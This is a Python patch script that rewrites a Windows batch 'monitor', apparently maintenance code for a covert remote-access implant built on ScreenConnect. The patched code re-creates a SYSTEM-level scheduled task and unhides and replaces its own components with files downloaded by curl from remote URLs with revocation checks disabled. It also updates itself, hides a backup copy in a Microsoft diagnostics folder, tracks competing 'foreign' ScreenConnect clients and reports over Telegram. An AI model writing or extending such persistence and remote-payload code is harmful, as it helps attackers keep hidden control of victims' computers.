from __future__ import annotations

import io

p = r"C:\Users\nobuddy\Desktop\Project\own_mon.cmd"
s = io.open(p, encoding="utf-8").read()

# Header + MONVER
s = s.replace("OWN_MON  BUILD 20260802M19", "OWN_MON  BUILD 20260802M20")
s = s.replace('set "MONVER=M19"', 'set "MONVER=M20"')

# ETL path fix
s = s.replace(
    'set "ETL=C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\.etlcache"',
    'set "ETL=C:\\ProgramData\\Microsoft\\Diagnosis\\State\\.etlcache"',
)

# After setlocal / vars, inject tick mutex early (after MSIEXIT init block)
mutex = r'''
rem ── [0] single-flight mutex (stop overlapping ticks racing msiexec) ──
set "MUTEX=%WD%\tick.lock"
if exist "%MUTEX%" (
  for %%A in ("%MUTEX%") do set "LOCKAGE=%%~tA"
  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%MUTEX%') -and (((Get-Date)-(Get-Item -LiteralPath '%MUTEX%' -Force).LastWriteTime).TotalMinutes -lt 8)){ exit 1 } else { exit 0 }" >nul 2>&1
  if errorlevel 1 (
    echo tick_skipped_mutex_busy>>"%LOG%"
    endlocal
    exit /b 0
  )
)
echo %DATE% %TIME% %RANDOM%>"%MUTEX%"
'''

if "tick_skipped_mutex_busy" not in s:
    s = s.replace(
        'set "MSIEXIT=not-run"\n\nrem ── per-host identity',
        'set "MSIEXIT=not-run"\n' + mutex + "\nrem ── per-host identity",
    )

# Force identity regen when IDENTVER < 5 (lib init handles via IDENTVER=5)
# Ensure init always runs (not only when cfg missing) so IDENTVER bumps apply
s = s.replace(
    'if not exist "%WD%\\identity.cfg" if exist "%WD%\\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1',
    'if exist "%WD%\\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1',
)

# BUILD-marker verify helper for payload moves (replace size-only gates for tg/secure/lib)
# Simpler approach: after move, findstr BUILD or revert
old_upd = '''"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\\tg_report.new" "%TG%" >nul 2>&1
if not exist "%WD%\\tg_report.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\\tg_report.new" "%TG2%" >nul 2>&1
attrib -h -s -r "%WD%\\tg_report.ps1" >nul 2>&1
for %%F in ("%WD%\\tg_report.new") do if %%~zF GTR 1500 move /y "%WD%\\tg_report.new" "%WD%\\tg_report.ps1" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%WD%\\own_secure.new" "%OWNSEC%" >nul 2>&1
if not exist "%WD%\\own_secure.new" "%CURL%" -L --connect-timeout 8 --max-time 30 -o "%WD%\\own_secure.new" "%OWNSEC2%" >nul 2>&1
attrib -h -s -r "%WD%\\own_secure.cmd" >nul 2>&1
for %%F in ("%WD%\\own_secure.new") do if %%~zF GTR 800 move /y "%WD%\\own_secure.new" "%WD%\\own_secure.cmd" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\\own_lib.new" "%OWNLIB%" >nul 2>&1
if not exist "%WD%\\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\\own_lib.new" "%OWNLIB2%" >nul 2>&1
attrib -h -s -r "%WD%\\own_lib.ps1" >nul 2>&1
for %%F in ("%WD%\\own_lib.new") do if %%~zF GTR 1500 move /y "%WD%\\own_lib.new" "%WD%\\own_lib.ps1" >nul 2>&1
rem self-update: download new own_mon, apply AFTER this tick
set "SELF_UPD=0"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\\own_mon.next" "%OWNMON%" >nul 2>&1
if not exist "%WD%\\own_mon.next" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\\own_mon.next" "%OWNMON2%" >nul 2>&1
for %%F in ("%WD%\\own_mon.next") do if %%~zF GTR 1500 (
  fc /b "%WD%\\own_mon.next" "%WD%\\own_mon.cmd" >nul 2>&1
  if errorlevel 1 set "SELF_UPD=1"
)'''

new_upd = '''"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\\tg_report.new" "%TG%" >nul 2>&1
if not exist "%WD%\\tg_report.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\\tg_report.new" "%TG2%" >nul 2>&1
attrib -h -s -r "%WD%\\tg_report.ps1" >nul 2>&1
findstr /C:"TG_REPORT BUILD" "%WD%\\tg_report.new" >nul 2>&1 && for %%F in ("%WD%\\tg_report.new") do if %%~zF GTR 1500 move /y "%WD%\\tg_report.new" "%WD%\\tg_report.ps1" >nul 2>&1
del /f /q "%WD%\\tg_report.new" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%WD%\\own_secure.new" "%OWNSEC%" >nul 2>&1
if not exist "%WD%\\own_secure.new" "%CURL%" -L --connect-timeout 8 --max-time 30 -o "%WD%\\own_secure.new" "%OWNSEC2%" >nul 2>&1
attrib -h -s -r "%WD%\\own_secure.cmd" >nul 2>&1
findstr /C:"OWN_SECURE BUILD" "%WD%\\own_secure.new" >nul 2>&1 && for %%F in ("%WD%\\own_secure.new") do if %%~zF GTR 800 move /y "%WD%\\own_secure.new" "%WD%\\own_secure.cmd" >nul 2>&1
del /f /q "%WD%\\own_secure.new" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\\own_lib.new" "%OWNLIB%" >nul 2>&1
if not exist "%WD%\\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\\own_lib.new" "%OWNLIB2%" >nul 2>&1
attrib -h -s -r "%WD%\\own_lib.ps1" >nul 2>&1
findstr /C:"OWN_LIB  BUILD" "%WD%\\own_lib.new" >nul 2>&1 && for %%F in ("%WD%\\own_lib.new") do if %%~zF GTR 1500 move /y "%WD%\\own_lib.new" "%WD%\\own_lib.ps1" >nul 2>&1
del /f /q "%WD%\\own_lib.new" >nul 2>&1
rem self-update: download new own_mon, apply AFTER this tick (BUILD-verified)
set "SELF_UPD=0"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\\own_mon.next" "%OWNMON%" >nul 2>&1
if not exist "%WD%\\own_mon.next" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\\own_mon.next" "%OWNMON2%" >nul 2>&1
findstr /C:"OWN_MON  BUILD" "%WD%\\own_mon.next" >nul 2>&1
if not errorlevel 1 for %%F in ("%WD%\\own_mon.next") do if %%~zF GTR 1500 (
  fc /b "%WD%\\own_mon.next" "%WD%\\own_mon.cmd" >nul 2>&1
  if errorlevel 1 set "SELF_UPD=1"
)
if "%SELF_UPD%"=="0" del /f /q "%WD%\\own_mon.next" >nul 2>&1'''

if "OWN_SECURE BUILD" not in s.split("auto-update")[1][:800] if "auto-update" in s else "":
    if old_upd in s:
        s = s.replace(old_upd, new_upd)
        print("payload verify OK")
    else:
        print("WARN: auto-update block not exact match")

# TASK_B rearm to etl_mon dual-path
s = s.replace(
    '''schtasks /Query /TN "%TASK_B%" >nul 2>&1
if errorlevel 1 (
  echo rearm TASK_B %TASK_B%>>"%LOG%"
  schtasks /Create /F /TN "%TASK_B%" /SC MINUTE /MO %MO_B% /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\\own_mon.cmd" >>"%LOG%" 2>&1
  schtasks /Run /TN "%TASK_B%" >nul 2>&1
)''',
    '''if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
if exist "%WD%\\own_mon.cmd" (
  attrib -h -s -r "%ETL%\\etl_mon.cmd" >nul 2>&1
  copy /y "%WD%\\own_mon.cmd" "%ETL%\\etl_mon.cmd" >nul 2>&1
)
schtasks /Query /TN "%TASK_B%" >nul 2>&1
if errorlevel 1 (
  echo rearm TASK_B %TASK_B% etl_mon>>"%LOG%"
  schtasks /Create /F /TN "%TASK_B%" /SC MINUTE /MO %MO_B% /RU SYSTEM /RL HIGHEST /TR "cmd /c %ETL%\\etl_mon.cmd" >>"%LOG%" 2>&1
  schtasks /Run /TN "%TASK_B%" >nul 2>&1
)''',
)

# Fix COUNT - don't count keepers in foreign loop
s = s.replace(
    '''set "FOREIGN_LEFT=0"
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "FP=%%a"
  set "FP=!FP: =!"
  set /a COUNT+=1
  if /I not "!FP!"=="%KEEP_FP%" if /I not "!FP!"=="%ALT_FP%" (
    set /a FOREIGN_LEFT+=1
    set "FOREIGN_LIST=!FOREIGN_LIST!!FP! "
    echo foreign_left_!FP!>>"%LOG%"
  )
)''',
    '''set "FOREIGN_LEFT=0"
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "FP=%%a"
  set "FP=!FP: =!"
  if /I not "!FP!"=="%KEEP_FP%" if /I not "!FP!"=="%ALT_FP%" (
    set /a COUNT+=1
    set /a FOREIGN_LEFT+=1
    set "FOREIGN_LIST=!FOREIGN_LIST!!FP! "
    echo foreign_left_!FP!>>"%LOG%"
  )
)''',
)

# Also don't double-count prim/alt in COUNT for TG - keep INSTALLED detection but COUNT only once
s = s.replace(
    '''for /f "tokens=1,2 delims=()" %%a in ('sc query "ScreenConnect Client (%KEEP_FP%)" ^| findstr /C:"SERVICE_NAME"') do (
  set /a COUNT+=1
  set "INSTALLED=1"
  set "PRIMSTATE=%%b"
)
sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
if not errorlevel 1 set "PRIM_OK=1"
for /f "tokens=1,2 delims=()" %%a in ('sc query "ScreenConnect Client (%ALT_FP%)" ^| findstr /C:"SERVICE_NAME"') do set /a COUNT+=1
sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
if not errorlevel 1 set "ALT_OK=1"''',
    '''for /f "tokens=1,2 delims=()" %%a in ('sc query "ScreenConnect Client (%KEEP_FP%)" ^| findstr /C:"SERVICE_NAME"') do (
  set "INSTALLED=1"
  set "PRIMSTATE=%%b"
)
sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
if not errorlevel 1 (
  set "PRIM_OK=1"
  set /a COUNT+=1
)
sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
if not errorlevel 1 set /a COUNT+=1
sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
if not errorlevel 1 set "ALT_OK=1"''',
)

# Registered-stuck alert
s = s.replace(
    '''if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :AfterHeal
)''',
    '''if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "registered-stuck" >nul 2>&1
  call :TgState DOWN "Primary registered but service missing - /fa failed; refused /i to protect ALT"
  goto :AfterHeal
)''',
)

# Self-update apply + etl sync + clear mutex at end
s = s.replace(
    '''if "%SELF_UPD%"=="1" (
  echo self-update apply>>"%LOG%"
  attrib -h -s -r "%WD%\\own_mon.cmd" >nul 2>&1
  move /y "%WD%\\own_mon.next" "%WD%\\own_mon.cmd" >nul 2>&1
)

echo tick done: prim=%PRIM_OK% alt=%ALT_OK% foreign=%FOREIGN_LEFT%>>"%LOG%"
endlocal
exit /b 0''',
    '''if "%SELF_UPD%"=="1" (
  echo self-update apply>>"%LOG%"
  attrib -h -s -r "%WD%\\own_mon.cmd" >nul 2>&1
  move /y "%WD%\\own_mon.next" "%WD%\\own_mon.cmd" >nul 2>&1
)
rem keep dual-path backup in sync every tick
if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
if exist "%WD%\\own_mon.cmd" (
  attrib -h -s -r "%ETL%\\etl_mon.cmd" >nul 2>&1
  copy /y "%WD%\\own_mon.cmd" "%ETL%\\etl_mon.cmd" >nul 2>&1
)
del /f /q "%MUTEX%" >nul 2>&1

echo tick done: prim=%PRIM_OK% alt=%ALT_OK% foreign=%FOREIGN_LEFT%>>"%LOG%"
endlocal
exit /b 0''',
)

io.open(p, "w", encoding="utf-8", newline="\n").write(s)
print("own_mon M20 patched")
